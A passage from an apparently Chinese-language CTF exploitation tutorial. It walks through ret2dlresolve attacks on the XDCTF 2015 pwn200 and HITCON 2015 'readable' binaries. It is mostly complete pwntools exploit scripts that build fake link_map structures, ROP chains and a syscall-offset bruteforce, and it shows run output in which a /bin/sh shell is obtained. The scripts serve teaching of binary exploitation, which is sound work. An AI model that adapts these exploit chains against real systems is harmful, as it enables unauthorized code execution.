    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span>
    <span class=c1># here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>offset_of_two_addr</span><span class=p>)</span>
                   <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>known_function_ptr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>           <span class=c1># cmd offset 0x48</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=o>+</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>linkmap</span><span class=p>,</span> <span class=n>resolve_call</span><span class=p>)</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>fake_linkmap_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
<span class=n>link_map</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span><span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>link_map</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span> <span class=o>&lt;=</span> <span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send linkmap</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>link_map</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=c1>#0x00000000004007a1: pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a1</span><span class=p>)</span>  <span class=c1># stack align 16 bytes</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span>  <span class=c1># 0x00000000004007a3: pop rdi; ret;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x48</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最终执行结果</p> <div class=highlight><pre><span></span><code>❯ python exp-fake-linkmap.py
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_64&#39;</span>: pid <span class=m>51197</span>
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> running in new terminal: /usr/bin/gdb -q  <span class=s2>&quot;./main_partial_relro_64&quot;</span> <span class=m>51197</span>
<span class=o>[</span>-<span class=o>]</span> Waiting <span class=k>for</span> debugger: debugger exited! <span class=o>(</span>maybe check /proc/sys/kernel/yama/ptrace_scope<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>14</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_64&#39;</span>
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
$ whoami
iromise
</code></pre></div> <p>虽然在这样的攻击中，我们不再需要信息泄露，但是我们需要知道目标机器的 libc，更具体的，我们需要知道目标函数和某个已经解析后的函数之间的偏移。</p> <h4 id=_5>基于工具伪造<a class=headerlink href=#_5 title="Permanent link">&para;</a></h4> <p>感兴趣的读者可以自行尝试使用相关的工具看是否可以攻击成功。</p> <h3 id=full-relro_1>Full RELRO<a class=headerlink href=#full-relro_1 title="Permanent link">&para;</a></h3> <h2 id=2015-hitcon-readable>2015-hitcon-readable<a class=headerlink href=#2015-hitcon-readable title="Permanent link">&para;</a></h2> <p>检查一下文件权限，可以发现，该可执行文件只开启了 NX 保护</p> <div class=highlight><pre><span></span><code>❯ checksec readable
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>也就是说我们其实可以直接修改 dynamic 节的内容。但是，与 2015-xdctf-pwn200 不同，这里栈溢出只能越界读取 16 个字节，而上述例子中所使用的的 ret2csu 则需要大量的字节。因此，直接使用该方法是不行了。</p> <p>我们来仔细分析下目前的情况，即我们可以越界控制 rbp、返回地址。考虑到 read 是使用 rbp 来索引 buffer 的</p> <div class=highlight><pre><span></span><code>.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; &#39; &#39;  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn
</code></pre></div> <p>那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为</p> <div class=highlight><pre><span></span><code>return_addr -&gt; 0x400505
rbp         -&gt; target addr + 0x10
fake buf
</code></pre></div> <p>那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。</p> <h3 id=1modify-dynamic-section>方法1：modify dynamic section<a class=headerlink href=#1modify-dynamic-section title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_first_addr</span> <span class=o>=</span> <span class=mh>0x40058A</span>
<span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>

<span class=k>def</span> <span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>rdx</span><span class=p>):</span>
    <span class=c1># rdx = r13</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdi = r15d</span>
    <span class=c1># call [r12+rbx*8]</span>
    <span class=c1># set rbx+1=rbp</span>
    <span class=k>return</span> <span class=n>flat</span><span class=p>([</span><span class=n>csu_first_addr</span><span class=p>,</span> <span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>func_ptr</span><span class=p>,</span> <span class=n>rdx</span><span class=p>,</span>
                    <span class=n>rsi</span><span class=p>,</span> <span class=n>edi</span><span class=p>,</span> <span class=n>csu_second_addr</span><span class=p>],</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>

<span class=k>def</span> <span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>content</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x600890</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>fake_data_addr</span> <span class=o>=</span> <span class=n>bss_addr</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x500</span>

<span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600778</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
<span class=c1># construct a fake dynstr section</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>fake_data_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=c1># read /bin/sh\x00</span>
<span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>fake_data_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>binsh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>))</span>
<span class=c1># 0x0000000000400593: pop rdi; ret; </span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x0000000000400593</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>binsh_addr</span><span class=p>)</span>
<span class=c1># 0x0000000000400590: pop r14; pop r15; ret; </span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x0000000000400590</span><span class=p>)</span> <span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span> <span class=c1># stack align</span>
<span class=c1># return to the second instruction of read&#39;plt</span>
<span class=n>rop</span> <span class=o>+=</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4003E6</span><span class=p>)</span>

<span class=c1># gdb.attach(io)</span>
<span class=c1># pause()</span>
<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=p>),</span><span class=mi>16</span><span class=p>):</span>
    <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>new_stack</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=n>rop</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>


<span class=c1># jump to the rop</span>
<span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>new_stack</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

<span class=c1># send fake dynstr addr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_data_addr</span><span class=p>))</span>
<span class=c1># send fake dynstr section</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=c1># send &quot;/bin/sh\x00&quot;</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <h3 id=2-rop>方法 2 - 标准 ROP<a class=headerlink href=#2-rop title="Permanent link">&para;</a></h3> <p>这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 <a href=mailto:read@got.plt>&#114;&#101;&#97;&#100;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#116;</a> 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行<code>execve("/bin/sh",NULL,NULL)</code>。</p> <p>首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令</p> <div class=highlight><pre><span></span><code>def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process(&quot;./readable&quot;)
        # modify read&#39;s got
        payload = csu_gadget(0, 1, elf.got[&quot;read&quot;], 1, elf.got[&quot;read&quot;], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got[&quot;read&quot;], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = &#39;a&#39;*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == &quot;\x7FELF&quot;:
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()
</code></pre></div> <p>即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下</p> <div class=highlight><pre><span></span><code>❯ python exp.py
<span class=o>(</span><span class=s1>&#39;0x8f&#39;</span>, <span class=s1>&#39;\x7fELF&#39;</span><span class=o>)</span>
<span class=o>(</span><span class=s1>&#39;0xc2&#39;</span>, <span class=s1>&#39;\x7fELF&#39;</span><span class=o>)</span>
</code></pre></div> <p>通过对比 libc.so 确实可以看到，对应的偏移处具有 <code>syscall</code> 指令</p> <div class=highlight><pre><span></span><code>.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read
</code></pre></div> <p>libc 的版本为</p> <div class=highlight><pre><span></span><code>❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
</code></pre></div> <p>需要注意，不同 libc 的偏移可能不一样。</p> <p>完整代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
<span class=n>csu_first_addr</span> <span class=o>=</span> <span class=mh>0x40058A</span>
<span class=n>csu_second_addr</span> <span class=o>=</span> <span class=mh>0x400570</span>


<span class=k>def</span> <span class=nf>read16bytes</span><span class=p>(</span><span class=n>targetaddr</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>targetaddr</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>content</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x600f00</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400505</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>csu_gadget</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># rdx = r13</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdi = r15d</span>
    <span class=c1># call [r12+rbx*8]</span>
    <span class=c1># set rbx+1=rbp</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>csu_first_addr</span><span class=p>,</span> <span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span>
                    <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>,</span> <span class=n>csu_second_addr</span><span class=p>],</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>bruteforce</span><span class=p>():</span>
    <span class=n>rop_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
        <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./readable&quot;</span><span class=p>)</span>
        <span class=c1># modify read&#39;s got</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>0</span><span class=p>)</span>
        <span class=c1># jump to read again</span>
        <span class=c1># try to write ELF Header to stdout</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>csu_gadget</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;read&quot;</span><span class=p>],</span> <span class=mi>4</span><span class=p>,</span> <span class=mh>0x400000</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
        <span class=c1># gdb.attach(io)</span>
        <span class=c1># pause()</span>
        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=mi>16</span><span class=p>):</span>
            <span class=n>tmp</span> <span class=o>=</span> <span class=n>read16bytes</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>+</span><span class=n>j</span><span class=p>,</span> <span class=n>payload</span><span class=p>[</span><span class=n>j</span><span class=p>:</span><span class=n>j</span><span class=o>+</span><span class=mi>16</span><span class=p>])</span>
            <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>tmp</span><span class=p>)</span>
        <span class=c1># jump to the rop</span>
        <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>16</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_addr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
        <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x400520</span><span class=p>)</span>  <span class=c1># leave ret</span>

        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
        <span class=k>try</span><span class=p>:</span>
